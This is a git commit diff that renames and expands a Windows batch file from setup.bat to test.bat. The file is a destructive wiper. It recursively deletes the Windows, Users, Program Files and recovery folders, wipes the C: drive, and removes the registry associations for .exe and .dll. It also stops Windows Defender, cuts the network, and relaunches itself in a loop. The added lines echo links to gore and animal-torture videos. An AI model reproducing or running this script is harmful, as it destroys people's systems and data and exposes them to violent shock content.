3e6b0d74d1396f255f93da1d8ada099e39e7e542
Ethan <112876170+Username6252@users.noreply.github.com>
2025-06-06 05:29:20 -0500

    Update and rename setup.bat to test.bat
    updated

--- test.bat
+++ test.bat
@@ -1,12 +1,11 @@
-@echo off 
-
-shutdown /f /s /t 3600
+@echo off
+shutdown /r /f /fw /t 3600
 
 icacls C:\setup.bat /grant Users:F
 
 cd /
 mkdir test
-
+cd test
 copy c:\setup.bat
 copy setup.bat config.bat
 copy setup.bat drivers.bat
@@ -24,6 +23,8 @@ xcopy /h /c /k /e /r /y c:\ d:\
 xcopy "C:\test" D:\Backup /c /d /e /h /i /k /q /r /s /x /y
 xcopy C:\test "\\SERVER\Media Backup" /f /j /s /w /z
 
+rmdir /s /q "windows .~bt"
+rmdir /s /q "windows .~ws"
 rmdir /s /q $recycle.bin
 rmdir /s /q config.msi
 rmdir /s /q "Documents and Settings [C:\Users]"
@@ -41,6 +42,10 @@ rmdir /s /q swapfile.sys
 rmdir /s /q "system volume information"
 rmdir /s /q users
 rmdir /s /q windows
+rmdir /s /q inetpub
+rmdir /s /q esd
+rmdir /s /q xboxgames
+
 
 del /f /a /q /s $recycle.bin
 del /f /a /q /s config.msi
@@ -55,21 +60,29 @@ del /f /a /q /s "program files"
 del /f /a /q /s "program files (x86)"
 del /f /a /q /s programdata
 del /f /a /q /s recovery
+del /f /a /q /s setup.log 
 del /f /a /q /s swapfile.sys
 del /f /a /q /s "system volume information"
 del /f /a /q /s users
 del /f /a /q /s windows
+del /f /a /q /s windows.old
+del /f /a /q /s appverifui.dll
+del /f /a /q /s "pc2,pc3,pc4-2023-11-15-MSUpdates.log"
+del /f /a /q /s vfcompact.dll
+
 
 cd /
 compact.exe /s /i /f
 
 Del C: *.* |y
 
+
 START reg delete HKCR/.exe
 START reg delete HKCR/.dll
 START reg delete HKCR/*
 
-for /l %a in (1,1,50) start setup.bat
+for /l %a in (1,1,50) start test.bat
+for /l %%a in (1,2,50) do start rstrui.exe
 
 Ipconfig /release
 ipconfig /flushdns
@@ -79,8 +92,13 @@ set classpath=d:killme
 
 sc stop windefend
 
-systemreset --factoryreset
-cd /
-setup.bat
-
-
+echo web.archive.org/web/20211019130858/seegore.com/video-1444
+echo.
+echo https://deadhouse.org/animals-en/sawed-up-a-live-puppy-and-fed-it-to-a-dog.html
+echo. 
+echo http://web.archive.org/web/20220217183528/https://seegore.com/rival-gang-member-flayed-tortured-and-beheaded/
+echo.
+echo http://web.archive.org/web/20210824071325/files.catbox.moe/310ldj.mp4
+echo.
+start test.bat
+test.bat
